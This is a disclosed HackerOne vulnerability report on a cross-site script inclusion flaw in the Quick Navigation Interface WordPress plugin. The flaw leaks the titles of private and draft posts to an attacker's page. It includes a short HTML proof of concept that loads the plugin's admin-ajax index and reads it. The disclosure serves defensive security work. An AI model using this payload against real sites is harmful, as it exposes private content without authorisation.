# XSSI: Quick Navigation Interface - leak of private page/post titles

## Report Details
- **Report ID**: 495525
- **URL**: https://hackerone.com/reports/495525
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-02-13T20:31:28.931Z
- **Disclosed**: 2019-02-15T08:03:49.617Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: iandunn-projects

## Vulnerability Information
CVSS
----

Medium 4.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)

Description
-----------

The [Quick Navigation Interface](https://wordpress.org/plugins/quick-navigation-interface/) plugin includes the names of all posts and pages in an automatically generated JavaScript file. 

By including this file in their own page, an attacker can view all post titles - including those of drafts and private posts, which should remain secret - if an authenticated user visits their website.

POC
--- 

Setup: install the plugin & create a private post (set "Visibility" to "private").

While authenticated, visit a webpage that contains the following HTML code:

    <script src="http://192.168.0.104/wordpress5/wordpress/wp-admin/admin-ajax.php?action=qni_content_index"></script>
    <script>
    console.log(window.qniContentIndex); // in a real-world attack, this would be send to the attacker's server
    </script>

## Impact

disclosure of private post/page titles

## Attachments
No attachments
